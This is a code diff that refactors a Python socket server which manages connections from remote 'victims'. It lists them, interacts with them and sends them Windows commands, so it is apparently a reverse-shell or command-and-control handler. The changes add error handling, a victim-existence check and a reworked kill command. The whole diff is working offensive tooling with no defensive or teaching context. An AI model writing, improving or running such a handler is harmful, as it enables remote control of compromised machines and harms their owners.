@@ -2,7 +2,6 @@ import socket
 import threading
 import json
 import sys
-import time
 
 class Server():
 
@@ -38,20 +37,41 @@ class Server():
             except (ConnectionResetError, OSError):
                 # Socket was closed/reset.
                 return None
-            
 
     def _accept_connection(self) -> None:
         """Adds conn, addr to connected_client dict."""
 
         while self.is_server_on:
 
-            conn, addr = self.sock.accept()
-            self.victim_count += 1
-            print(f"Got connection from {addr}")
+            try:
+                conn, addr = self.sock.accept()
+                self.victim_count += 1
+                print(f"Got connection from {addr}")
 
-            self.victims_dict.update({self.victim_count: conn})
+                self.victims_dict.update({self.victim_count: conn})
 
+            except Exception as e:
+                print(e)
+                
 
+    def _close_connection(self, victim_id:int) -> None:
+
+        if not self._victim_exists(victim_id):
+            print(f"[!] No client associated with that ID, {victim_id}.")
+            return
+        
+        conn:socket.socket = self.victims_dict.get(victim_id)
+
+        try:
+            print(f"[+] Clossing connection with {conn}")
+            conn.close()
+            self.victims_dict.pop(victim_id)
+            self.victim_count -= 1
+
+        except Exception as e:
+            print(f"[!] Error occured: {e}")
+            return
+        
     def _console_help(self):
         commands = {
             "help\t": "Print this help menu.",
@@ -71,21 +91,19 @@ class Server():
         commands = {
             "help\t": "Print this help menu.",
             "back\t": "Return to the console(background to current connection).",
-            "kill\t": "Close current connection.",
-            "----\t": "All defualt windows command."
+            "    \t": "All defualt windows command."
         }
 
-    def _kill_victim(self, victim_id:int) -> None:
-        
-        conn = self.victims_dict.get(victim_id)
+        for cmd in commands:
+            print(f"{cmd}\t{commands.get(cmd)}")
 
-        print(f"[+] Clossing connection with {conn}")
+    def _victim_exists(self, id:int) -> bool:
+        """Takes victim id to check if it exists or not. Returns True if victim exists, else False."""
 
-        self.victims_dict.pop(victim_id)
-        self.victim_count -= 1
-        conn.close()
+        if id not in self.victims_dict.keys():
+            return False
 
-
+        return True
 
     def _list_victims(self):
         print(f"[+] Total {self.victim_count} victims...")
@@ -96,6 +114,10 @@ class Server():
 
     def _interact_victim(self, victim_id) -> None:
 
+        if not self._victim_exists(victim_id):
+            print(f"[!] Victim with ID, {victim_id} does not exists.")
+            return
+
         conn:socket.socket = self.victims_dict.get(victim_id)
 
         while conn:
@@ -104,10 +126,6 @@ class Server():
 
             if "help" == data:
                 self._victim_help()
-    
-            elif "kill" == data:
-                self._kill_victim(victim_id)
-                break
 
             elif "back" == data:
                 break
@@ -126,23 +144,35 @@ class Server():
     def console(self):
 
         while self.is_server_on:
+            try:
 
-            cmd = input("--> ").lower().strip(' ')
+                cmd = input("--> ").lower().strip(' ')
 
-            if cmd == "help":
-                self._console_help()
+                if cmd == "help":
+                    self._console_help()
 
-            elif cmd == "exit":
-                self.is_server_on = False
+                elif cmd == "exit":
+                    self.is_server_on = False
 
-            elif cmd == "jobs":
-                self._list_victims()
+                # Close a specific connection
+                elif cmd.startswith("kill"):
+                    self._close_connection(int(cmd[4:].strip(' ')))
 
-            elif cmd[:8] == "interact":
-                self._interact_victim(int(cmd[8:]))
+                elif cmd == "jobs":
+                    self._list_victims()
 
-            else:
-                print("[-] Please enter a valid command")
+                elif cmd[:8] == "interact":
+                    self._interact_victim(int(cmd[8:]))
+
+                else:
+                    print("[-] Please enter a valid command")
+
+
+            except KeyboardInterrupt:
+                print("[+] type 'exit' to exit.")
+
+            except Exception as e:
+                print(e)
 
     def start_server(self):
 
@@ -170,16 +200,14 @@ class Server():
             a_t = threading.Thread(target=self._accept_connection, daemon=True)
             a_t.start()
         except Exception as e:
-            print(e)
+            print(f"[!] {e}")
 
         try:
             print("[+] Type 'help' for menu.")
             c_t = threading.Thread(target=self.console)
             c_t.start()
-        except KeyboardInterrupt:
-            print("[+] type 'exit' to exit.")
         except Exception as e:
-            print(e)
+            print(f"[!] {e}")
 
 
 if __name__ == "__main__":
